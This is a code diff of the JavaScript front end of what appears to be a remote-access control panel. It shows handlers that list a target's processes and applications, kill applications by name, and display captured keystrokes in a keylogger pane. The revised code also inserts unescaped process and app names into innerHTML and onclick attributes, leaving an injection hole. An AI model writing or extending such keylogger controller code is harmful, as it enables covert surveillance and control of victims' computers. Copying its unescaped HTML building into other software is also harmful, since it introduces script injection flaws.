+            const tb = document.querySelector('#proc-table tbody');
+            tb.innerHTML = "";
+            (res.data.process_list || []).slice(0, 300).forEach(p => {
+                tb.innerHTML += `<tr onclick="document.getElementById('proc-pid').value='${p.pid}'"><td>${p.pid}</td><td>${p.name}</td><td>${p.threads}</td></tr>`;
             });
-            log(`> Process list updated: ${list.length} entries.`);
+            updateTicker(`PROCESS LIST UPDATED: ${res.data.process_list.length} NODES.`);
         }
-
-        // APP LIST
-        else if (res.module === 'APP' && res.command === 'LIST') {
-            const tbody = document.querySelector('#app-table tbody');
-            tbody.innerHTML = "";
-            (res.apps || []).forEach(app => {
-                const row = tbody.insertRow();
-                row.insertCell().innerText = app.exe;
-                const btn = document.createElement('button');
-                btn.innerText = "KILL"; 
-                btn.className = "btn-red"; btn.style.fontSize = "10px";
-                btn.onclick = () => send('APP', 'KILL', { name: app.exe });
-                row.insertCell().appendChild(btn);
+        else if(res.module==='APP' && res.command==='LIST') {
+            const tb = document.querySelector('#app-table tbody');
+            tb.innerHTML = "";
+            (res.apps || []).forEach(a => {
+                tb.innerHTML += `<tr><td>${a.exe}</td><td><button class="btn-red" style="padding:0 5px;" onclick="send('APP','KILL',{name:'${a.exe}'})">X</button></td></tr>`;
             });
-            log(`> App list updated.`);
+            updateTicker("APPLICATION REGISTRY SCANNED.");
         }
-
-        // KEYLOGGER
-        else if (res.module === 'KEYBOARD' && res.command === 'PRESS') {
-            let k = res.data.key;
-            if(k === '[ENTER]') k = '\n';
-            const txt = document.getElementById('keylog-out');
-            txt.value += k;
-            txt.scrollTop = txt.scrollHeight;
-        }
-        
-        else {
-            log(`ℹ️ [${res.module}] ACK: ${res.message || 'OK'}`);
+        else if(res.module==='KEYBOARD') {
+            const t = document.getElementById('keylog-out');
+            let k = res.data.key; if(k==='[ENTER]') k='\n';
+            t.value += k; t.scrollTop = t.scrollHeight;
         }
     }
 </script>
